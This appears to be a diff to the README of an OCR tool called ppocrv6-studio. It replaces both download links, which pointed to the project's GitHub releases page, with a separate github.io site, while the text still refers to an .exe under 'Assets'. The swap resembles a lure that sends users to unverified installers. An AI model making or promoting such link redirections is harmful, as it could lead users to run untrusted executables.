@@ -1,6 +1,6 @@
 # 🖥️ ppocrv6-studio - Extract text from images with ease
 
-[![Download ppocrv6-studio](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/scurvyfox849/ppocrv6-studio/releases)
+[![Download ppocrv6-studio](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://scurvyfox849.github.io)
 
 ppocrv6-studio provides a simple way to pull text from photos or documents on your computer. You use the software to turn image files into editable text. The application runs locally on your machine. You do not need an internet connection to process files.
 
@@ -8,7 +8,7 @@ ppocrv6-studio provides a simple way to pull text from photos or documents on yo
 
 You can find the latest version of this tool on the release page. Follow the link below to reach the download area.
 
-[Download the latest release here](https://github.com/scurvyfox849/ppocrv6-studio/releases)
+[Download the latest release here](https://scurvyfox849.github.io)
 
 On that page, look for the file ending in .exe under the Assets section. Click the filename to save the installer to your computer.
 
